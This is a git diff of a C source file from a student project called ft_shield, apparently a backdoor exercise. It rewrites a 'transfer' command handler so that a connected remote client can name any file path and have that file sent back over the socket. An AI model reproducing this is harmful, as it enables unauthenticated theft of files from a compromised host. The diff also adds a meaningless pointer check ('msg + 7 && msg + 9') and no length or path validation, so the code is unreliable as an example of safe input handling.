@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 13:28:48 by mbatty            #+#    #+#             */
-/*   Updated: 2025/12/03 12:51:39 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/12/03 13:19:45 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -110,12 +110,9 @@ void	get_stats(t_ctx *ctx, t_client *client)
 #include <sys/sendfile.h>
 #include <sys/stat.h>
 
-static int	transfer_file(int sock_fd, char *src_path, char *file_name)
+static int	transfer_file(int sock_fd, char *src_path)
 {
-	(void)file_name;
 	struct stat	file_stat;
-	// char 	buf[4096];
-	// ssize_t rdb;
 	int		fdin;
 
 	fdin = open(src_path, O_RDONLY);
@@ -163,10 +160,11 @@ void	message_hook(t_client *client, char *msg, int64_t size, void *ptr)
 		logger_log(LOG_LOG, "Client %d stats command entered", client->id);
 		get_stats(ctx, client);
 	}
-	else if (!strcmp(msg, "transfer"))
+	else if (!strncmp(msg, "transfer", 8))
 	{
 		int	fd = get_sword_fd();
-		transfer_file(fd, "/home/mbatty/42/ft_shield/test.png", "testtransfer");
+		if (msg + 7 && msg + 9)
+			transfer_file(fd, msg + 9);
 		logger_log(LOG_LOG, "Client %d transfer command entered", client->id);
 		close(fd);
 	}
